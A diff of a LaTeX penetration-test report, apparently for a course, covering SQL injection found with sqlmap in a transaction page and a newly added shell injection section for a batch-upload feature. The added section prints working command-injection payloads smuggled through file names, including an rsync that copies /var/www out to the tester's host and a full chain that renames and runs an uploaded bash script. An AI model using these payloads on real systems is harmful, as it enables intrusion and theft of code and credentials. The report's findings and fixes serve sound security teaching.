@@ -1,8 +1,9 @@
 
+\chapter{Injection Attacks}
 
-\chapter{MYSQL Injection}
+\section{SQL Injection}
 
-\section{Observation}
+\subsection{Observation}
 
 We discovered that the request \textit{host-ip/sc-course/views/transactions/tan\_entry.php?transaction\_id=x} is vulnerable to MYSQL Injections.
 The attacker has to be logged in as user in order to create a new transaction . After inserting an account number and an amount for the new transaction the above-named request is sent. The user now would have to insert the TAN. At this point the parameter "transaction\_id can be used for all kind mysql  injections.
@@ -14,7 +15,7 @@ Impact:      	high\newline
 
 Risk: high \newline
 
-\section{Discovery}
+\subsection{Discovery}
 This vulnerability was discovered by the tool sqlmap. The result of the first Test in Listing \ref{listing:first_test} shows that GET-Parameter is vulnerable.
 
 
@@ -128,21 +129,94 @@ A further possibillity is to break the authentication of the database by hijacki
 With a integrated dictionary-based password cracking tool, you can convert the hashed password to plain text assuming weak passwords (like in our case). Now you can access adminer web-interface and login as root.
 
 
-\section{Likelihood}
+\subsection{Likelihood}
 Assuming that the attacker has basic knowledge about MySql-Injection and knows how to use sqlmap, it's very likely that this vulnerability will be exploited.
 
 
-\section{Implication}
+\subsection{Implication}
 The vulnerability in combination with sqlmap leads to full compromise of all data, stored in the database. The attacker can hijack information about the names of databases, tables, columns of tables and can even dump whole tables.  In our special case, it was even possible to get the users' passwords in plaintext, because they weren't hashed.
 You can also get the name and the password of the root user of the database. This was benifited by a weak password, whereby the plain password could be recovered from the received hash within seconds. This results in full write access to the database for the attacker.
 
 
-\section{Recommendations}
+\subsection{Recommendations}
 It's highly recommended, that all inputs for SQL queries are sanitized by escaping the ' character.
 Another option is to create query objects via msqli instead of using simple query strings.
 This objects will automatically sanitized all inputs. For more information, please go to \url{https://www.owasp.org/index.php/SQL\_Injection}
 
 This observation is related to OWASP Top 10-A1-Injections
 
-\section{Comparison with our App}
+\subsection{Comparison with our App}
 We avoided SQL-Injection by using Prepared Statements. Therefore the user inputs are sanitized and injections like shown above are not possible.
+
+\section{Shell Injection}
+
+\subsection{Observation}
+
+During the vulnerability testing of the batch transaction we discovered a shell injection. When uploading a file, it seems that the original file name the user chose is directly appended to the executable name of the C program and then given to the shell. Due to this we can use the file name to execute other programs, we even managed it to let the file be executed by bash.\newline
+
+
+Likelihood:  medium - high\newline
+
+Impact: high\newline
+
+Risk: high\newline
+
+\subsection{Discovery}
+
+The discovery was easily found by simply uploading a file called \textit{\&\& sleep 30}. We then noticed that the response of the server is delayed by about 30 seconds. This was reason enough to try some more. We then tried to execute code which will download the \textit{/var/www} directory to our local box. The main problem was that it is not possible to use slashes in Unix file names. That means we can not easily change directories or name the file something like this:
+
+\begin{lstlisting}[caption=File with '/' (does not work), label=listing:not_working_file]
+&& rsync /var/www mybox::myshare
+\end{lstlisting}
+
+Due to this we wanted to be the uploaded file be interpreted by bash on the host, so we could just write a simple bash script with the following content:
+
+\begin{lstlisting}[caption=Bash Script to Get PHP Code, label=listing:bash_script]
+rsync /var/www mybox::myshare
+\end{lstlisting}
+
+The problem is, we need to somehow integrate the bash execution in our file name like this:
+
+\begin{lstlisting}[caption=Executing code via bash, label=listing:execute_bash_script]
+... && bash script.sh
+\end{lstlisting}
+
+That means that we need somehow get to the directory the uploaded file is located, we assumed \textit{/tmp/\$filename}.
+
+So we need to change the directory to \textit{/tmp/}. We archived that to create a temporary directory, change to it, and then change to the upper directory like illustrated in Listing \ref{listing:change_to_tmp}. We had to do that because we cannot use slashes in the file name.
+
+\begin{lstlisting}[caption=Change to \textit{/tmp/}, label=listing:change_to_tmp]
+&& dir=`mktemp` && cd dir && cd .. 
+\end{lstlisting}
+
+Now we are in the directory were our shell script was uploaded. Now we have to execute it. Unfortunately this is pretty hard, because we cannot simply reference the script via the file name, because the file name is also the command we want to inject and we would then get into some recursive loop specifying the hole file name. The solution is to rename the file to some easier name like\textit{script.sh} and then execute it, illustrated in Listing \ref{listing:rename_file}.
+
+\begin{lstlisting}[caption=Rename the file, label=listing:rename_file]
+ ... && mv *.sh script.sh && bash script.sh
+\end{lstlisting}
+ 
+ We are moving the file \textit{*.sh} to script.sh (Our uploaded file ends with \textit{.sh}).
+ 
+ Listing \ref{listing:complete_file_name} shows the complete file name\footnote{The \textit{rm -rf script.sh} is used to delete any script which was uploaded by a former attack, otherwise renaming the file would fail because \textit{script.sh} would already exist.} which we have used to execute our code.
+ 
+\begin{lstlisting}[caption=Complete File Name, label=listing:complete_file_name]
+&& dir=`mktemp` && cd dir && cd .. && rm -rf script.sh && mv *.sh script.sh && bash script.sh
+\end{lstlisting}
+
+The command sent to the shell by the PHP code would look similar to this:
+
+\begin{lstlisting}[caption=Shell Command executed by PHP, label=listing:shell_comannd]
+./cparser && dir=`mktemp` && cd dir && cd .. && rm -rf script.sh && mv *.sh script.sh && bash script.sh
+\end{lstlisting}
+
+\subsection{Likelihood}
+It took us hours to get this exploit working, but with some basic knowledge of the Unix Shell and Linux this exploit was possible with moderate effort.
+
+\subsection{Implication}
+A successful attack makes the server executing any code or program you like. We managed to get the hole PHP source code, where e.g. the database password is stored. It would be also possible to get other files like \textit{/etc/passwd} or execute other malicious code!
+
+\subsection{Recommendations}
+The easiest way to fix this issue is to use temporary randomly assigned file names and get rid of the one the user chose (Do not trust the user's unput!). Normally this is done automatically by PHP, moving the file to the originally chosen file name by the user is optional but part of most tutorials on the Internet.
+
+\subsection{Comparison with our App}
+Our application is always using the temporary name PHP saved the file under. That means the application is not affected by this vulnerability, because we do not care about the user given name of the file.
